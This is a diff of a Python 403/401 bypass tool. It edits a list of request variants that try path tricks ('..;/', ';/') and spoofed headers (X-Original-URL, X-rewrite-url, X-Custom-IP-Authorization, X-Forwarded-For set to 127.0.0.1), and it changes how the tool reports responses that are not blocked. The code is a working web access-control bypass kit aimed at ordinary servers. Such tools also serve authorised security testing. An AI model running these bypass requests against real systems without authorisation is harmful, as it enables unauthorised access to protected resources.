@@ -22,10 +22,10 @@ request_objects = [
     {"method": "GET", "path": "/$path.json"},
     {"method": "GET", "path": "/$path..;/"},
     {"method": "GET", "path": "/$path;/"},
-    {"method": "GET", "path": "", "headers": {"X-rewrite-url": "/$path"}},
+    {"method": "GET", "path": "", "headers": {"X-rewrite-url": "$path"}},
     {"method": "POST","path": "/$path", "headers": {"Content-Length": "0"}},
     {"method": "GET", "path": "/$path", "headers": {"X-Host": "127.0.0.1"}},
-    {"method": "GET", "path": "/$path", "headers": {"X-Original-URL": "/$path"}},
+    {"method": "GET", "path": "/$path", "headers": {"X-Original-URL": "$path"}},
     {"method": "GET", "path": "/$path", "headers": {"X-Custom-IP-Authorization": "127.0.0.1"}},
     {"method": "GET", "path": "/$path", "headers": {"X-Forwarded-For": "http://127.0.0.1"}},
     {"method": "GET", "path": "/$path", "headers": {"X-Forwarded-For": "127.0.0.1:80"}},
@@ -109,8 +109,6 @@ def getArgs():
     return parser.parse_args()
 
 def sendRequest(host, path, custom_headers):
-    #Base request
-    #http://example.com/path
     url = host + "/" + "path"
     try:
         headers = {header.split(":")[0]: header.split(":")[1].strip() for header in custom_headers} if custom_headers else {}
@@ -143,20 +141,19 @@ def attemptBypass(host, path, custom_headers):
                 for header in custom_headers:
                     header_key, header_value = header.split(":", 1)
                     headers[header_key] = header_value.strip()
-            # Replace placeholders in headers
             for key in headers:
                 headers[key] = headers[key].replace('$path', path)
             try:
                 response = method_map[method](url, headers=headers, verify=False)
                 if response.status_code == 200:
-                    print(f"\033[32mMethod: {method}, URL: {url}, Status Code: {response.status_code}, "
-                        f"Request Headers: {headers}, Size: {len(response.content)} bytes\033[0m")
+                    print(f"\033[32m{method} {response.status_code} {url} "
+                        f"Request Headers: {headers} {len(response.content)} bytes\033[0m")
                 elif response.status_code == 500:
-                    print(f"\033[31mMethod: {method}, URL: {url}, Status Code: {response.status_code}, "
-                        f"Request Headers: {headers}, Size: {len(response.content)} bytes\033[0m")
+                    print(f"\033[31m{method} {response.status_code} {url} "
+                        f"Request Headers: {headers} {len(response.content)} bytes\033[0m")
                 elif response.status_code != 403 and response.status_code != 401:
-                    print(f"\033[33mMethod: {method}, URL: {url}, Status Code: {response.status_code}, "
-                        f"Request Headers: {headers}, Size: {len(response.content)} bytes\033[0m")
+                    print(f"\033[33m{method} {response.status_code} {url} "
+                        f"Request Headers: {headers} {len(response.content)} bytes\033[0m")
             except requests.exceptions.ConnectionError:
                 pass
             except requests.RequestException:
